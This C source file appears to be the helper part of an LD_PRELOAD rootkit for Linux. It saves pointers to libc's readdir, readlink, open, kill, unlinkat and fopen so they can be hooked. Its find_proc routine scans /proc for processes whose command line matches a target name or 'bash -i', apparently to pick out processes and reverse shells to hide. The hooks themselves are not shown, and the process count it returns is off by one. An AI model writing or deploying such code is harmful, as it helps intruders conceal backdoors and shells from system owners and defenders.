#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdbool.h>
#include <dirent.h>
#include <string.h>

#include "log.h"
#include "util.h"

static struct dirent* (*oreaddir)(DIR * ) = NULL;
static ssize_t (*oreadlink)(const char *, char *, size_t) = NULL;
static int (*oopen)(const char*, int, ...) = NULL;
static int (*okill)(pid_t, int) = NULL;
static int (*ounlinkat)(int, const char*, int) = NULL;
static FILE* (*ofopen)(const char *, const char*) = NULL;

void *find_addr(char *symbol){
  // RTLD_NEXT is not defined, unless you use #define _GNU_SOURCE
  void *address = dlsym(RTLD_NEXT, symbol);
  if (address == NULL){
    debug("cant find address");
    exit(0);
  }
  return address;
}

char * replace(char * string, char x, char y, int len){
  for(int i = 0; i< len; i++){
    if(string[i]==x){
      string[i] = y;
    }
  }
  return string;
}

struct proc find_proc(const char* name) {
  // simply loops over /proc , grabs all the 
  // process and compares their cmdline with the 
  // parameter "name"
  struct dirent* entry;
  struct proc ret;
  int i = 0;
  DIR* dir;

  ret.pid = (int*)malloc(sizeof(int));
  ret.alive = false;
 
  dir = opendir("/proc");
  if (dir == NULL){
    return ret;
  }

  while ((entry = readdir(dir)) != NULL) {
    if (entry->d_type != DT_DIR) {  
      continue;
    }

    char pidp[strlen(entry->d_name)+50];
    sprintf(pidp, "/proc/%s/cmdline", entry->d_name);
    FILE* cmdline = fopen(pidp, "r");
    
    if (!cmdline){
      continue;
    }

    char buffer[256];
    size_t len = fread(buffer, 1, sizeof(buffer) - 1, cmdline);
    fclose(cmdline);
    char* cmd = replace(buffer, '\0', ' ', len);

    if(strstr(cmd, name)==NULL && strstr(cmd, "bash -i")==NULL){
      continue;
    }

    ret.pid[i] = atoi(entry->d_name);
    i += 1;
    ret.pid = (int*)realloc(ret.pid, (i+1)*sizeof(int));
  }

  if (i>0){
    ret.alive = true;
  }
  ret.pid_count = i+1;
  closedir(dir);
  return ret;
}

